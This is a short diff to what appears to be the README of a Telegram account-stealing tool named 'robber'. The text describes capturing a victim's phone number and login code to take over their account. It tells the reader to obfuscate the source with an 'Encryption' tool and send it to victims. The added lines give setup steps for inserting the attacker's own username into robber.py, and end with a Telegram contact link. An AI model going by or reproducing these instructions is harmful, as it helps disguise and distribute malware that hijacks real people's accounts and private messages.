@@ -40,3 +40,10 @@ This file comes from the user, takes the Telegram account number, login code and
 ohh, that's what we wanted! Now we can listen to the messages! We activate the listener and enter the victim's number in Telegram and receive the code! That's it! You are logged in!
 
 Now all you have to do is encrypt this source using the "Encryption" tool and send it to your victims!
+
+# Setup Robber
+
+Just open the robber.py file and put your username in the "you" variable on line 9! Instead of @ServerKill3r
+
+
+Telegram: https://t.me/MrEsfelurm
